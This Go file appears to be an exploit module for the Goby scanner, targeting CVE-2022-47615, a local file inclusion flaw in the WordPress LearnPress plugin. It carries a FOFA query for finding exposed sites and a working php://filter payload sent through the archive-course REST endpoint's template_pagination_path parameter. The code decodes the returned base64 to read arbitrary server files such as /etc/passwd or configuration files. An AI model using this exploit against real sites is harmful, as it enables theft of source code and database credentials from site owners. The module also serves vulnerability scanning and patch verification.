package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin LearnPress archive-course File Inclusion Vulnerability (CVE-2022-47615)",
    "Description": "<p>LearnPress is a comprehensive WordPress LMS Plugin for WordPress. This is one of the best WordPress LMS Plugins which can be used to easily create &amp; sell courses online.</p><p>WordPress LearnPress Plugin &lt;= 4.1.7.3.2 is vulnerable to Local File Inclusion.</p>",
    "Product": "wordpress-plugin-learnpress",
    "Homepage": "https://wordpress.org/plugins/learnpress",
    "DisclosureDate": "2023-01-20",
    "Author": "sunying",
    "FofaQuery": "body=\"wp-content/plugins/learnpress\"",
    "GobyQuery": "body=\"wp-content/plugins/learnpress\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/learnpress\">https://wordpress.org/plugins/learnpress</a></p>",
    "References": [
        "https://patchstack.com/database/vulnerability/learnpress/wordpress-learnpress-plugin-4-1-7-3-2-local-file-inclusion"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "custom,C:\\Windows\\php.ini,C:\\Windows\\system.ini,/etc/passwd,/etc/hosts",
            "show": ""
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "filePath=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "File Inclusion"
    ],
    "VulType": [
        "File Read",
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2022-47615"
    ],
    "CNNVD": [
        "CNNVD-202301-2041"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress Plugin LearnPress archive-course 文件包含漏洞（CVE-2022-47615）",
            "Product": "wordpress-plugin-learnpress",
            "Description": "<p>LearnPress 是适用于 WordPress 的综合性 WordPress LMS 插件。 这是最好的 WordPress LMS 插件之一，可用于轻松创建和在线销售课程。<br>WordPress LearnPress 插件 &lt;= 4.1.7.3.2存在文件包含漏洞，攻击者利用该漏洞可获取敏感文件。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/learnpress\">https://wordpress.org/plugins/learnpress</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取",
                "文件包含"
            ],
            "Tags": [
                "文件读取",
                "文件包含"
            ]
        },
        "EN": {
            "Name": "WordPress Plugin LearnPress archive-course File Inclusion Vulnerability (CVE-2022-47615)",
            "Product": "wordpress-plugin-learnpress",
            "Description": "<p>LearnPress is a comprehensive WordPress LMS Plugin for WordPress. This is one of the best WordPress LMS Plugins which can be used to easily create &amp; sell courses online.</p><p>WordPress LearnPress Plugin &lt;= 4.1.7.3.2 is vulnerable to Local File Inclusion.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/learnpress\">https://wordpress.org/plugins/learnpress</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read the leaked source code, database configuration files, etc., resulting in an extremely insecure website.<br></p>",
            "VulType": [
                "File Read",
                "File Inclusion"
            ],
            "Tags": [
                "File Read",
                "File Inclusion"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10791"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			file_inclusion_exp := `php://filter/convert.base64-encode/resource=wp-content/plugins/learnpress/inc/rest-api/v1/frontend/class-lp-rest-courses-controller.php`
			vuln_url := fmt.Sprintf("/wp-json/lp/v1/courses/archive-course?template_pagination_path=%s", file_inclusion_exp)
			cfg := httpclient.NewGetRequestConfig(vuln_url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if response, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(response.RawBody, "\"status\":\"success\",") {
				r, _ := regexp.Compile(`(.+?){"status":`)
				if len(r.FindStringSubmatch(response.RawBody)) > 1 {
					base64_str := r.FindStringSubmatch(response.RawBody)[1]
					decoded, _ := base64.StdEncoding.DecodeString(base64_str)
					decodestr_exp := string(decoded)
					if strings.Contains(decodestr_exp, "template_pagination_path") {
						return true
					} else {
						return false
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			if filePath == "custom" {
				filePath = ss.Params["custom"].(string)
			}
			file_inclusion_exp := fmt.Sprintf(`php://filter/convert.base64-encode/resource=%s`, filePath)
			vuln_url := fmt.Sprintf("/wp-json/lp/v1/courses/archive-course?template_pagination_path=%s", file_inclusion_exp)
			cfg := httpclient.NewGetRequestConfig(vuln_url)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if response, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(response.RawBody, "\"status\":\"success\",") {
				r, _ := regexp.Compile(`(.+?){"status":`)
				base64_str := r.FindStringSubmatch(response.RawBody)[1]
				decoded, _ := base64.StdEncoding.DecodeString(base64_str)
				decodestr_exp := string(decoded)
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output += decodestr_exp
			}
			return expResult
		},
	))
}
